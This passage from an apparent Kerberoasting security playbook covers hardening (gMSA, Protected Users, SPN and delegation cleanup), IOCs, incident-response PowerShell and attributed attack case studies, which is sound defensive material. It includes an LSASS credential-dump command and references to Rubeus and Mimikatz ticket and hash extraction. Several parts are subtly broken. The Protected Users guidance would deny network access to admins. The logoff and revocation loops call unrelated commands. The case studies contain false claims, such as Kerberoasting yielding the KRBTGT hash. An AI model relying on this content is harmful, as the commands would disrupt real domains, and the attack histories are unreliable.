**Applies To Versions:** Server 2012 R2 and later (gMSA); Server 2025 (dMSA - newer, better)

**Manual Steps (Create gMSA):**

1. On a Domain Controller (elevated PowerShell):
   ```powershell
   # Import AD module
   Import-Module ActiveDirectory
   
   # Create KDS Root Key (one-time per domain)
   Add-KDSRootKey -EffectiveImmediately
   
   # Wait 10 hours or use -EffectiveImmediately for testing
   ```

2. Create the gMSA account:
   ```powershell
   New-ADServiceAccount -Name "SQL_gMSA" `
     -Description "Managed account for SQL Server" `
     -ManagedPasswordIntervalInDays 30 `
     -Enabled $true
   
   # Assign computers that can use this account
   Set-ADServiceAccount -Identity "SQL_gMSA" `
     -PrincipalsAllowedToRetrieveManagedPassword "DOMAIN\SQL_ServerGroup"
   ```

3. On the target server (SQL Server), install the gMSA:
   ```powershell
   # Elevated PowerShell on SQL Server
   Install-ADServiceAccount -Identity "SQL_gMSA"
   
   # Verify installation
   Test-ADServiceAccount -Identity "SQL_gMSA"
   ```

4. Change SQL Server service to use the gMSA:
   - Open **SQL Server Configuration Manager**
   - Right-click **SQL Server (MSSQLSERVER)** → **Properties** → **Log On Tab**
   - Account Name: `DOMAIN\SQL_gMSA$`
   - Leave password blank (gMSA manages it)
   - Click **Apply** → **Restart Service**

**Verification Command:**
```powershell
# On any server in the domain
Get-ADServiceAccount -Filter {Name -eq "SQL_gMSA"} | Select-Object Name, ManagedPasswordIntervalInDays, PrincipalsAllowedToRetrieveManagedPassword
```

**Server 2025 - Delegated Managed Service Accounts (dMSA):**
```powershell
# dMSA has advantage of seamless migration from legacy service accounts
New-ADServiceAccount -Name "NewService_dMSA" `
  -DNSHostName "newservice.domain.com" `
  -Enabled $true
  
# Works similarly to gMSA but with better migration path
```

**Action 3: Apply "Protected Users" Group Restrictions**

The Protected Users group prevents weak encryption and disables NTLM.

**Applies To Versions:** Server 2012 R2 and later

**Manual Steps:**

1. Open **Active Directory Users and Computers** (dsa.msc)
2. Navigate to **Users** folder
3. Create a new global security group (if not exists): **Protected Admins**
4. Add high-privilege accounts: Domain Admin, Enterprise Admin, Tier-0 service accounts
5. Open **Group Policy Management Console** (gpmc.msc)
6. Create/edit GPO: **Domain Controllers Default Policy** → **Edit**
7. Go to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
8. Set: **Deny Access to this computer from the network**
   - Add: `Protected Users` group (to restrict network access if compromised)
9. Run: `gpupdate /force`

**Verification:**
```powershell
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountName
```

### Priority 2: HIGH

**Action 1: Remove Unnecessary SPNs from User Accounts**

SPNs should only be on service accounts, not regular user accounts.

**Identify and Remove SPNs:**

```powershell
# Find all user accounts (not computer accounts) with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName | 
  Where-Object {$_.ObjectClass -eq "user"}

# Remove SPN from a user account
Set-ADUser -Identity "DisabledServiceAccount" -ServicePrincipalNames @{}

# Or remove specific SPN
Set-ADUser -Identity "Account" -ServicePrincipalNames @{Remove="MSSQLSvc/oldserver:1433"}
```

**Action 2: Enforce Strong Passwords for Service Accounts**

Minimum 25 characters, randomly generated, rotated annually.

**Manual Steps:**

1. Create a custom password policy (Fine-Grained Password Policy)
   ```powershell
   New-ADFineGrainedPasswordPolicy -Name "ServiceAccountPolicy" `
     -Complexity $true `
     -MinPasswordLength 25 `
     -PasswordHistoryCount 12 `
     -LockoutDuration 00:30:00 `
     -LockoutThreshold 5 `
     -PasswordNotRequiredTimeoutEnabled $false `
     -Precedence 10
   
   # Apply to service account group
   Add-ADFineGrainedPasswordPolicySubject -Identity "ServiceAccountPolicy" `
     -Subject "CN=ServiceAccountGroup,CN=Users,DC=domain,DC=local"
   ```

2. Generate random 25-character password:
   ```powershell
   [Guid]::NewGuid().Guid -Replace '-', '' # Not recommended; use proper password manager
   
   # Better: Use Bitwarden, 1Password, or Azure Key Vault to generate and store
   ```

3. Apply password policy:
   ```powershell
   Set-ADAccountPassword -Identity "SQL_Service" `
     -NewPassword (ConvertTo-SecureString -AsPlainText "RandomPassword123!@#$%^&*" -Force) `
     -Reset
   ```

**Action 3: Restrict Delegation on Service Accounts**

Unconstrained delegation allows ticket-forwarding attacks; use constrained or resource-based constrained delegation.

**Check Delegation Status:**
```powershell
Get-ADUser -Identity "SQL_Service" -Properties msDS-AllowedToDelegateTo, TrustedForDelegation |
  Select-Object Name, TrustedForDelegation, msDS-AllowedToDelegateTo
```

**Disable Unconstrained Delegation:**
```powershell
Set-ADUser -Identity "SQL_Service" -TrustedForDelegation $false
Set-ADUser -Identity "SQL_Service" -msDS-AllowedToDelegateTo @() # Clear constrained delegation
```

**Enable Constrained Delegation (if needed):**
```powershell
Set-ADUser -Identity "SQL_Service" `
  -msDS-AllowedToDelegateTo @("MSSQLSvc/sql-server.domain.local:1433")
```

### Access Control & Policy Hardening

**Conditional Access Policies (If using Azure/Entra ID):**
- Require multi-factor authentication for service account access
- Block legacy authentication protocols
- Require compliant devices for service account operations

**RBAC (Role-Based Access Control) Adjustments:**
1. Audit all service accounts with Domain Admin or equivalent roles
2. Reduce privileges: Remove from Domain Admins; use custom roles
3. Example:
   ```powershell
   Remove-ADGroupMember -Identity "Domain Admins" -Members "SQL_Service" -Confirm:$false
   # Add to custom group with minimal permissions instead
   ```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\Temp\Rubeus.exe` (tool binary)
- `C:\Temp\hashes.txt`, `tickets.txt` (extracted hashes)
- `C:\Users\*\Downloads\GetUserSPNs.py` (Impacket tool)
- `C:\Temp\krb5tgs_*` (Kerberoasting output)

**Registry:**
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters\SupportedEncTypes` = 23, 28, 31 (RC4 enabled)
- Unusual service account password changes (check audit log)

**Network:**
- DNS queries: `_ldap._tcp.dc._msdcs.domain.local` (DC discovery)
- Port 389/636 (LDAP) burst from workstations (SPN enumeration)
- Port 88 (Kerberos) unusual traffic patterns

**Event Log:**
- **Event ID 4769** with `TicketEncryptionType=0x17` in volume (>10 per minute per user)
- **Event ID 4624** for service account logons at unusual times
- **Event ID 4768** (TGT requests) for disabled or never-login accounts

### Forensic Artifacts

**Disk (Windows):**
- MFT entries for `Rubeus.exe`, `hashcat.exe`, `GetUserSPNs.py`
- Slack space for deleted tool binaries
- `C:\Windows\Prefetch\` for execution history (`Rubeus.exe-*.pf`)

**Memory (RAM Dump):**
- Rubeus process `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` API calls
- LSASS.exe contains cached Kerberos tickets (extract with `Rubeus dump`)
- Service account password hashes (if Mimikatz used)

**Cloud (If hybrid Entra ID):**
- `AuditLogs` table: Service Principal authentication attempts
- `SigninLogs` table: Service account logins from unusual IPs
- `IdentityLogonEvents` (Sentinel): `AttackTechniques contains "T1558.003"`

### Response Procedures

#### 1. Immediate Containment (Minutes 0-15)

**Isolate Affected Accounts:**

```powershell
# Disable compromised service account
Disable-ADAccount -Identity "SQL_Service"

# Force logoff active sessions
Get-ADUser -Identity "SQL_Service" | 
  Get-ADPrincipalGroupMembership | 
  ForEach-Object { 
    $users = Get-ADGroupMember -Identity $_.SamAccountName -Recursive
    Reset-ComputerMachinePassword -Force # On affected servers
  }

# Reset password (complex, 25+ characters)
Set-ADAccountPassword -Identity "SQL_Service" -NewPassword (ConvertTo-SecureString -AsPlainText "NewSecurePassword!@#$%^&*()" -Force) -Reset

# Re-enable account
Enable-ADAccount -Identity "SQL_Service"
```

**Isolate Affected Servers (If High-Risk):**

```powershell
# Disconnect network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or via Azure (cloud-based servers)
# Portal → Virtual Machines → [VM] → Networking → Disconnect
```

#### 2. Evidence Collection (Minutes 15-60)

**Export Security Event Logs:**

```powershell
# Export last 48 hours of 4769 events from all DCs
$DCs = Get-ADDomainController -Filter * | Select-Object -ExpandProperty HostName

foreach ($dc in $DCs) {
    wevtutil epl Security "C:\Evidence\Security_$($dc)_4769.evtx" `
      /r:$dc `
      /q:"*[System[(EventID=4769) and TimeCreated[timediff(@SystemTime) <= 172800000]]]"
}

# Export with filter for target service account
wevtutil epl Security "C:\Evidence\SQL_Service_4769.evtx" `
  /q:"*[System[(EventID=4769)] and EventData[Data[@Name='TargetUserName']='SQL_Service']]"
```

**Capture Memory Dumps (If Rubeus Suspected):**

```powershell
# Use ProcDump (SysInternals)
procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp

# Or via PowerShell (less reliable)
$Process = Get-Process lsass
[System.Diagnostics.Debug]::WriteLineIf($true, "Process ID: $($Process.Id)")
```

**Check Prefetch Files (Execution History):**

```powershell
Get-ChildItem -Path "C:\Windows\Prefetch\" -Filter "*Rubeus*" -Force
Get-ChildItem -Path "C:\Windows\Prefetch\" -Filter "*Hashcat*" -Force

# Export prefetch for analysis (requires forensic tools)
Copy-Item "C:\Windows\Prefetch\*.pf" -Destination "C:\Evidence\" -Force
```

#### 3. Remediation (Hours 1-4)

**Reset All Compromised Service Account Passwords:**

```powershell
# Find all service accounts with SPNs
$ServiceAccounts = Get-ADUser -Filter {servicePrincipalName -ne $null} -Properties servicePrincipalName

foreach ($account in $ServiceAccounts) {
    # Generate secure password
    $password = [System.Web.Security.Membership]::GeneratePassword(25, 5)
    
    # Reset password
    Set-ADAccountPassword -Identity $account.SamAccountName `
      -NewPassword (ConvertTo-SecureString -AsPlainText $password -Force) `
      -Reset
    
    Write-Host "[*] Reset: $($account.SamAccountName) - New password stored in password manager"
}
```

**Audit and Revoke Kerberoasting-Accessed Resources:**

```powershell
# Force re-authentication to all resources
Get-ADUser -Filter {servicePrincipalName -ne $null} | 
  ForEach-Object {
    # Log out service account from all sessions
    logoff /s:$env:COMPUTERNAME /id:* /v 2>$null
  }
```

#### 4. Investigation (Hours 4+)

**Timeline Reconstruction:**

1. Identify first 4769 event for target SPN (initial compromise time)
2. Correlate with process creation events (EventID 1) for Rubeus, hashcat
3. Cross-reference with PowerShell ScriptBlock logs (EventID 4104) for PS-based enumeration
4. Check DNS query logs for DC discovery patterns

**Threat Hunt:**

```powershell
# Find all event logs with Kerberoasting keywords
Get-WinEvent -FilterXPath "*[EventData[Data[@Name='Status']='0x0']]" -LogName Security | 
  Where-Object {$_.TimeCreated -ge (Get-Date).AddHours(-72)} | 
  Select-Object TimeCreated, @{N="Message";E={$_.Message}} | 
  Export-Csv "C:\Evidence\Threat_Hunt_72hr.csv" -NoTypeInformation
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566 - Phishing] | Attacker sends spear-phishing email to domain user to gain initial foothold |
| **2** | **Persistence** | [T1547 - Boot or Logon Autostart Execution] | Establish persistence via scheduled task or registry modification |
| **3** | **Privilege Escalation** | [T1548 - Abuse Elevation Control Mechanism] | Escalate from standard user to higher privileges (or lateral move) |
| **4** | **Credential Access - Enumeration** | [T1087.002 - Domain Account Discovery] | Enumerate Domain Admin and service accounts via LDAP |
| **5** | **Credential Access - Current Technique** | **[CA-KERB-001: Kerberoasting]** | **Request and crack service account credentials** |
| **6** | **Lateral Movement** | [T1021 - Remote Services] | Use compromised service account to access SQL Server, SharePoint, or other services |
| **7** | **Persistence** | [T1098 - Account Manipulation] | Modify service account password or add to privileged groups |
| **8** | **Exfiltration / Impact** | [T1020 - Data Transfer Size Limits] or [T1565 - Data Destruction] | Exfiltrate data via compromised service account; deploy ransomware |

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Nobelium) - SolarWinds Supply Chain Compromise (December 2020)

- **Target:** 18,000+ organizations (U.S. Dept. of Treasury, Homeland Security, intelligence agencies)
- **Timeline:** September 2019 - December 2020 (15+ months dwell time)
- **Technique Status:** Kerberoasting used in **post-compromise lateral movement phase** (not initial access)
- **Attack Chain:**
  1. Supply-chain compromise: Backdoor inserted into SolarWinds Orion software (SUNBURST)
  2. Command & control established via SUNBURST
  3. **Kerberoasting executed** to escalate from compromised Orion server to domain credentials
  4. Lateral movement to IT admin workstations and sensitive systems
  5. Persistence via Golden Ticket creation (using KRBTGT hash obtained via Kerberoasting + Mimikatz)
  6. Data exfiltration (8-10 months post-compromise)
- **Impact:** Full domain compromise; access to classified intelligence; critical infrastructure disrupted
- **Detection Gap:** Kerberoasting went undetected for months; focus on TGS request volume anomalies missed
- **Reference:** [Microsoft MSTIC - SolarWinds Compromise Analysis](https://www.microsoft.com/security/blog/2021/01/23/a-deep-dive-into-microsoft-threat-intelligence-on-the-solarium-incident/)

#### Example 2: FIN7 (Carbanak) - Ransomware-as-a-Service Campaigns (2020-2021)

- **Target:** Fortune 500 companies, financial institutions, healthcare organizations
- **Timeline:** Post-initial access, mid-stage lateral movement
- **Technique Status:** Kerberoasting used for **credential harvesting → ransomware deployment**
- **Attack Chain:**
  1. Initial access: Phishing → Cobalt Strike implant
  2. Enumeration: PowerView to identify service accounts and SPNs
  3. **Kerberoasting: Rubeus to extract and crack service account passwords**
  4. Lateral movement: Use compromised accounts to move across infrastructure
  5. Privilege escalation: Pivot to Domain Admin via compromised high-privilege service account
  6. Payload deployment: Darkside ransomware across 100+ systems (encrypted within 24 hours)
- **Impact:** Up to $50M+ ransom demanded; critical business operations halted
- **Detection Gap:** RC4 downgrade attacks blended with legacy systems; alert fatigue on TGS floods
- **Reference:** [CrowdStrike - FIN7 Ransomware Campaign](https://www.crowdstrike.com/blog/carbon-spider-gearing-up-for-a-big-darkside-to-come/)

#### Example 3: Conti Ransomware Group - Post-Exploitation Privilege Escalation (February 2021)

- **Target:** Critical infrastructure, financial services
- **Timeline:** Day 3-5 of intrusion (post-initial compromise)
- **Technique Status:** Kerberoasting used as **privilege escalation vector after acquiring initial domain user**
- **Attack Chain:**
  1. Initial access: Phishing with malicious Office macro attachment
  2. Execution: PowerShell script execution; reverse shell established
  3. **Kerberoasting: Automated script to request all TGS tickets; Hashcat running on external GPU cluster**
  4. Privilege escalation: Compromised service account (SQL Server admin)
  5. Persistence: Create rogue admin accounts; install web shells
  6. Impact: Ransomware deployment; $10M+ data exfiltration
- **Detection Gap:** Outbound C2 traffic to external cracking cluster was not detected; password expiration policies not enforced
- **Reference:** [Conti Case Study - Ransomware-as-a-Service](https://redcanary.com/blog/threat-detection/conti-ransomware-group/)

#### Example 4: Wizard Spider - Ongoing Kerberoasting in Modern Environments (2024-2025)

- **Target:** Healthcare, manufacturing, financial services (mixed Server 2016-2025 environments)
- **Timeline:** Current active threat
- **Technique Status:** Kerberoasting STILL ACTIVE despite AES deployment; weak passwords remain the vulnerability
- **Attack Chain:**
  1. Initial access: Phishing or RDP exploitation
  2. Enumeration: Identify mixed encryption environment (some AES, some RC4)
  3. **Kerberoasting Strategy:**
     - Target RC4-enabled accounts directly (fastest crack time: hours)
     - Target AES accounts with weak passwords (common in legacy service accounts; crack time: days-weeks)
  4. Privilege escalation: Compromise gMSA-wrapped service account (attack failed; long password)
  5. Lateral movement: Use cracked weak-password service account for persistence
- **Impact:** Ongoing BEC scams, ransomware-as-a-service payments, credential marketplace sale
- **Detection:** Organizations with proper RC4 deprecation + strong password policies are protected; others remain vulnerable
- **Reference:** [IBM X-Force Threat Report 2024 - Wizard Spider Active](https://www.ibm.com/reports/threat-intelligence)

---

## 16. ATTACK CHAIN CONTEXT

### Preconditions (What Access is Needed Before This Technique)

- **Minimum:** Valid domain user account (even unprivileged/guest account can enumerate SPNs)
- **Ideal:** Compromised workstation with domain connectivity (allows reconnaissance without leaving suspicious logins)
- **Recommended for Stealth:** Presence in a domain with RC4 enabled or weak service account passwords

### Post-Exploitation (What This Enables After)

- **Lateral Movement:** Use compromised service account credentials to access:
  - SQL Server databases
  - SharePoint/Office 365 environments
  - Application servers running as service account
  - Network appliances with hardcoded service accounts
- **Privilege Escalation:** If compromised account is in Domain Admins or other privileged groups
- **Persistence:** Create backdoor admin accounts; modify GPOs; install persistence mechanisms
- **Impact:**
  - Data exfiltration via SQL access
  - Ransomware deployment via application server access
  - Long-dwell compromise with rotating credentials

---